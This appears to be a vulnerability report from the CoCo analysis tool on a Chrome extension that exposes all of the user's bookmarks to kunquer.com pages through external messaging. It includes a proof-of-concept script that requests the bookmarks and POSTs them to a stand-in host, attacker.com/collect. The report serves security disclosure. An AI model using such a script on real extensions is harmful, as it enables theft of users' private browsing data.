# CoCo Analysis: lbhlilmkohaogiejpflobpkcloflnfea

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (BookmarkTreeNode_source to sendResponseExternal_sink)

---

## Sink: BookmarkTreeNode_source ’ sendResponseExternal_sink (referenced only CoCo framework code)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lbhlilmkohaogiejpflobpkcloflnfea/opgen_generated_files/bg.js
Line 845-861: CoCo framework mock code (BookmarkTreeNode definition)

The CoCo trace referenced only framework mock code. However, the actual vulnerability exists in the original extension code at line 965.

**Code:**

```javascript
// Background script - External message listener (bg.js line 965, formatted for readability)
chrome.runtime.onMessageExternal.addListener((function(e, o, n) {
  if ("bookmark" === e.name) {
    return chrome.bookmarks.getTree(e => {
      const o = getBookInfo(e[0].children); //  processes bookmark tree
      n(o); //  sends all bookmarks to external caller
    }), !0
  }
}));

// Helper function to process bookmark tree
function treehelper2(e) {
  if (Array.isArray(e))
    for (const o of e) treehelper2(o);
  else {
    for (const o of Object.keys(e))
      "title" !== o && "url" !== o && "children" !== o && delete e[o];
    e.children && treehelper2(e.children)
  }
}

function getBookInfo(e) {
  return treehelper2(e), e; // Returns bookmark tree with title, url, children
}

// Also exposed via internal messages (line 965):
chrome.runtime.onMessage.addListener((function(e, o, n) {
  // ...
  if ("bookmark" === e.name)
    return chrome.bookmarks.getTree(e => {
      const o = getBookInfo(e[0].children);
      n(o)
    }), !0
}));
```

**Manifest.json permissions:**
```json
"permissions": [
  "bookmarks",
  "contextMenus",
  "cookies",
  "tabs",
  "storage"
],
"externally_connectable": {
  "matches": ["*://*.kunquer.com/*"]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messaging from whitelisted domains

**Attack:**

```javascript
// From any page matching externally_connectable domains (e.g., https://kunquer.com/*, https://app.kunquer.com/*)
// An attacker who compromises any kunquer.com subdomain can execute:

chrome.runtime.sendMessage(
  'lbhlilmkohaogiejpflobpkcloflnfea', // extension ID
  { name: 'bookmark' },
  function(bookmarks) {
    console.log('Stolen bookmarks:', bookmarks);
    // Send all user bookmarks to attacker's server
    fetch('https://attacker.com/collect', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        victim: 'user_id',
        data: bookmarks
      })
    });
  }
);

// The response contains the entire bookmark tree with:
// - All bookmark titles
// - All bookmark URLs
// - Folder structure (children)
```

**Impact:** An attacker who controls or compromises any subdomain of kunquer.com can steal the user's complete browser bookmark collection. Bookmarks often contain sensitive information such as internal company URLs, banking sites, personal accounts, and can reveal the user's browsing habits and interests. This information can be used for phishing attacks, social engineering, or selling on the dark web. The vulnerability exposes all bookmarks including those in private folders with no user interaction or permission prompt.
